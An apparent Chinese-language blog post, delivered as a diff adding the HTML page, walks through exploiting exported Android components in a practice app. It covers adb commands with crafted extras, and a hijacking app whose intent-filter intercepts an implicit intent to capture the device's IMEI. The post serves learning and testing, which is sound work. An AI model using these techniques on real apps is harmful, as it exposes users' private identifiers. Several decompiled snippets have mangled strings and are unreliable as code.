@@ -1,0 +1,1380 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="组件安全,android,security," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Android 安全之组件安全1. 暴露Activity组件漏洞利用的目的：通过当前已经暴露的组件跳转访问到私有组件界面。 漏洞利用过程：根据反编译可以看出，触发通过的条件是传入值为1的int变量key和值为“hello”的String变量value。 123456789101112private void a() &amp;#123;    Intent intent &#x3D; getIntent();">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20200721Android安全之组件安全">
+<meta property="og:url" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Anred&#39;s Blog">
+<meta property="og:description" content="Android 安全之组件安全1. 暴露Activity组件漏洞利用的目的：通过当前已经暴露的组件跳转访问到私有组件界面。 漏洞利用过程：根据反编译可以看出，触发通过的条件是传入值为1的int变量key和值为“hello”的String变量value。 123456789101112private void a() &amp;#123;    Intent intent &#x3D; getIntent();">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/1.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/2.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/4.PNG">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/9.png">
+<meta property="article:published_time" content="2020-07-20T16:01:18.000Z">
+<meta property="article:modified_time" content="2020-07-20T16:11:06.656Z">
+<meta property="article:author" content="Peng Zhang">
+<meta property="article:tag" content="组件安全">
+<meta property="article:tag" content="android">
+<meta property="article:tag" content="security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/07/21/20200721Android安全之组件安全/"/>
+
+
+
+
+
+  <title>20200721Android安全之组件安全 | Anred's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anred's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Peng Zhang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anred's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">20200721Android安全之组件安全</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-21T00:01:18+08:00">
+                2020-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/android-security/" itemprop="url" rel="index">
+                    <span itemprop="name">android security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/" class="leancloud_visitors" data-flag-title="20200721Android安全之组件安全">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.7k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Android-安全之组件安全"><a href="#Android-安全之组件安全" class="headerlink" title="Android 安全之组件安全"></a>Android 安全之组件安全</h1><h2 id="1-暴露Activity组件"><a href="#1-暴露Activity组件" class="headerlink" title="1. 暴露Activity组件"></a>1. 暴露Activity组件</h2><h3 id="漏洞利用的目的："><a href="#漏洞利用的目的：" class="headerlink" title="漏洞利用的目的："></a>漏洞利用的目的：</h3><p>通过当前已经暴露的组件跳转访问到私有组件界面。</p>
+<h3 id="漏洞利用过程："><a href="#漏洞利用过程：" class="headerlink" title="漏洞利用过程："></a>漏洞利用过程：</h3><p>根据反编译可以看出，触发通过的条件是传入值为1的int变量key和值为“hello”的String变量value。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Intent intent = getIntent();</span><br><span class="line">    <span class="keyword">if</span> (intent != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = intent.getIntExtra(<span class="string">"key"</span>, <span class="number">0</span>);</span><br><span class="line">        String str = intent.getStringExtra(<span class="string">"value"</span>);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1</span> &amp;&amp; <span class="string">"hello"</span>.equals(str))</span><br><span class="line">            dosomething(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dosomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    startActivity(<span class="keyword">new</span> Intent((Context)<span class="keyword">this</span>, NoExportActivity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由此，利用adb命令访问activity组件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.example.bughunter/com.example.bughunter.ComponentSecurity.ExportActivity --ei key 1 -e value "hello"</span><br></pre></td></tr></table></figure>
+
+<p>利用start访问activity组件，其中“-n”后面是“包名/类名”，“–ei”表示传入int类型值，“-e”表示传入String值。由此，即可进入私有隐藏界面。</p>
+  <div align="left">  <img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/1.PNG" alt="1" style="zoom:60%;">
+<a id="more"></a>
+
+<h2 id="2-暴露Service组件"><a href="#2-暴露Service组件" class="headerlink" title="2. 暴露Service组件"></a>2. 暴露Service组件</h2><h3 id="漏洞利用的目的：-1"><a href="#漏洞利用的目的：-1" class="headerlink" title="漏洞利用的目的："></a>漏洞利用的目的：</h3><p>成功访问暴露的Service。</p>
+<h3 id="漏洞利用过程：-1"><a href="#漏洞利用过程：-1" class="headerlink" title="漏洞利用过程："></a>漏洞利用过程：</h3><p>根据反编译可以看出，触发通过的条件是传入值action为”exportService”。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent paramIntent, <span class="keyword">int</span> paramInt1, <span class="keyword">int</span> paramInt2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (paramIntent.getAction().equals(<span class="string">"exportService"</span>)) &#123;</span><br><span class="line">            Toast.makeText((Context)<span class="keyword">this</span>, <span class="string">", 0).show();</span></span><br><span class="line"><span class="string">                           &#125; else &#123;</span></span><br><span class="line"><span class="string">                               Toast.makeText((Context)this, "</span>, <span class="number">0</span>).show();</span><br><span class="line">                                              &#125; </span><br><span class="line">                                              &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                                                  Toast.makeText((Context)<span class="keyword">this</span>, <span class="string">", 0).show();</span></span><br><span class="line"><span class="string">                                                                 &#125; </span></span><br><span class="line"><span class="string">                                                                 return super.onStartCommand(paramIntent, paramInt1, paramInt2);</span></span><br><span class="line"><span class="string">                                                                 &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>由此，利用adb命令访问service组件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am startservice -n com.example.bughunter/com.example.bughunter.ComponentSecurity.ExportService -a "exportService"</span><br></pre></td></tr></table></figure>
+
+<p>利用startservice访问service组件，其中“-n”后面是“包名/类名”，“-a”表示传入的action。由此，即可成功运行暴露的Service。</p>
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/2.PNG" alt="2" style="zoom:60%;">
+
+
+
+<h2 id="3-暴露Broadcast组件"><a href="#3-暴露Broadcast组件" class="headerlink" title="3. 暴露Broadcast组件"></a>3. 暴露Broadcast组件</h2><h3 id="漏洞利用的目的：-2"><a href="#漏洞利用的目的：-2" class="headerlink" title="漏洞利用的目的："></a>漏洞利用的目的：</h3><p>访问暴露的广播组件。通过传参访问广播组件并发送自定义内容的广播。</p>
+<h3 id="漏洞利用过程：-2"><a href="#漏洞利用过程：-2" class="headerlink" title="漏洞利用过程："></a>漏洞利用过程：</h3><p>根据反编译可以看出，触发通过的条件是传入值action为”broadcast”。传入标题为“title”，传入内容为“content”。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendNotification</span><span class="params">(String paramString1, String paramString2, Context paramContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">26</span>)</span><br><span class="line">        createNotificationChannel(<span class="string">"channelId"</span>, <span class="string">", 4); </span></span><br><span class="line"><span class="string">                                  NotificationCompat.Builder builder = new NotificationCompat.Builder(paramContext, "</span>channelId<span class="string">");</span></span><br><span class="line"><span class="string">                                  builder.setSmallIcon(2131361792);</span></span><br><span class="line"><span class="string">                                  builder.setContentTitle(paramString1);</span></span><br><span class="line"><span class="string">                                  builder.setContentText(paramString2);</span></span><br><span class="line"><span class="string">                                  Notification notification = builder.build();</span></span><br><span class="line"><span class="string">                                  this.mManager.notify(1, notification);</span></span><br><span class="line"><span class="string">                                  Toast.makeText(paramContext, "</span>, <span class="number">0</span>).show();</span><br><span class="line">                                                 &#125;</span><br><span class="line">                                                 <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context paramContext, Intent paramIntent)</span> </span>&#123;</span><br><span class="line">                                                     <span class="keyword">if</span> (<span class="string">"broadcast"</span>.equals(paramIntent.getAction())) &#123;</span><br><span class="line">                                                         <span class="keyword">this</span>.mManager = (NotificationManager)paramContext.getSystemService(<span class="string">"notification"</span>);</span><br><span class="line">                                                         <span class="keyword">try</span> &#123;</span><br><span class="line">                                                             sendNotification(paramIntent.getStringExtra(<span class="string">"title"</span>), paramIntent.getStringExtra(<span class="string">"content"</span>), paramContext);</span><br><span class="line">                                                         &#125; <span class="keyword">catch</span> (Exception exception) &#123;&#125;</span><br><span class="line">                                                     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                                         Toast.makeText((Context)exception, <span class="string">", 0).show();</span></span><br><span class="line"><span class="string">                                                                        &#125; </span></span><br><span class="line"><span class="string">                                                                        &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>由此，利用adb命令访问broadcast组件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -n com.example.bughunter/com.example.bughunter.ComponentSecurity.ExportReceiver -a "broadcast" -e "title" "Success" -e "content" "Successfully_delivered!"</span><br></pre></td></tr></table></figure>
+
+<p>利用broadcast访问broadcast组件，其中“-n”后面是“包名/类名”，“-a”表示传入的action“broadcast”，“-e”后的“title”和“content”表示自定义的下拉内容。由此，即可成功通过传参访问广播组件并发送自定义内容的广播。</p>
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/3.png" alt="3" style="zoom:60%;">
+
+<h2 id="4-组件劫持"><a href="#4-组件劫持" class="headerlink" title="4. 组件劫持"></a>4. 组件劫持</h2><h3 id="漏洞利用的目的：-3"><a href="#漏洞利用的目的：-3" class="headerlink" title="漏洞利用的目的："></a>漏洞利用的目的：</h3><p>劫持带有个人数据（此处为IMEI码）私有组件，获取个人数据。</p>
+<h3 id="漏洞利用过程：-3"><a href="#漏洞利用过程：-3" class="headerlink" title="漏洞利用过程："></a>漏洞利用过程：</h3><p>根据反编译可以看出，私有组件启动intent的方式是以指定action的方式，action为“hijack”。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String str = GetInformation.getImei((Context)<span class="keyword">this</span>);</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent(<span class="string">"hijack"</span>);</span><br><span class="line">    intent.putExtra(<span class="string">"imei"</span>, str);</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由此，编写了一个APK，声明同样名字的action的暴露组件。当点击运行带参跳转的私有组件时，即可触发同样名字action的暴露组件，获得私有隐私数据IMEI码。</p>
+<p>APK编写的过程是：</p>
+<ul>
+<li>设置intent-filter使得action为“hijack”的intent可以通过过滤。</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"hijack"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建筛选出符合过滤器要求的intent的函数isActionSupport。当筛选符合过滤器要求的intent以后，获取intent，选择action为“hijack”的intent，获取名叫“imei”的String，利用Toast弹出“imei”的值。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onStart();</span><br><span class="line">    hijackSetting(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">hijackSetting</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isActionSupport(context,<span class="string">"hijack"</span>)) &#123;</span><br><span class="line">        Intent intent2=getIntent();</span><br><span class="line">        <span class="keyword">if</span>(Objects.equals(intent2.getAction(), <span class="string">"hijack"</span>)) &#123;</span><br><span class="line">            String msg = intent2.getStringExtra(<span class="string">"imei"</span>);</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, msg, Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isActionSupport</span><span class="params">(Context context, String action)</span></span>&#123;</span><br><span class="line">    <span class="keyword">final</span> PackageManager packageManager = context.getPackageManager();</span><br><span class="line">    <span class="keyword">final</span> Intent intent = <span class="keyword">new</span> Intent(action);</span><br><span class="line">    List&lt;ResolveInfo&gt; resolveInfo =</span><br><span class="line">        packageManager.queryIntentActivities(intent,</span><br><span class="line">                                             PackageManager.MATCH_DEFAULT_ONLY);</span><br><span class="line">    <span class="keyword">return</span> resolveInfo.size() &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<div align="left"><img src="/2020/07/21/20200721Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/4.PNG" alt="4" style="zoom:60%;">
+
+<h2 id="5-动态注册广播"><a href="#5-动态注册广播" class="headerlink" title="5. 动态注册广播"></a>5. 动态注册广播</h2><h3 id="漏洞利用的目的：-4"><a href="#漏洞利用的目的：-4" class="headerlink" title="漏洞利用的目的："></a>漏洞利用的目的：</h3><p>当前组件发送一个动态广播，对此实现获取个人数据、使组件崩溃和日志泄露。</p>
+<h3 id="漏洞利用过程：-4"><a href="#漏洞利用过程：-4" class="headerlink" title="漏洞利用过程："></a>漏洞利用过程：</h3><p>根据反编译可以看出，组件发送广播和接收广播的过程，其中传递的私有数据为“imei”，action为“broadcast”。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.b1 = (Button)findViewById(<span class="number">2131165238</span>);</span><br><span class="line">    <span class="keyword">this</span>.b1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View param1View)</span> </span>&#123;</span><br><span class="line">            String str = GetInformation.getImei((Context)DynamicBroadcastActivity.<span class="keyword">this</span>);</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(<span class="string">"broadcast"</span>);</span><br><span class="line">            intent.putExtra(<span class="string">"imei"</span>, str);</span><br><span class="line">            DynamicBroadcastActivity.<span class="keyword">this</span>.sendBroadcast(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">this</span>.t1 = (TextView)findViewById(<span class="number">2131165380</span>);</span><br><span class="line">    <span class="keyword">this</span>.t1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View param1View)</span> </span>&#123;</span><br><span class="line">            DynamicBroadcastActivity.<span class="keyword">this</span>.t1.setText(<span class="number">2131427375</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadcast</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context param1Context, Intent param1Intent)</span> </span>&#123;</span><br><span class="line">        Toast.makeText((Context)DynamicBroadcastActivity.<span class="keyword">this</span>, <span class="string">", 0).show();</span></span><br><span class="line"><span class="string">                       Log.i("</span>bughunter<span class="string">", param1Intent.getStringExtra("</span>imei<span class="string">"));</span></span><br><span class="line"><span class="string">                       &#125;</span></span><br><span class="line"><span class="string">                       &#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建通过接收广播获取私有数据的函数并执行。</p>
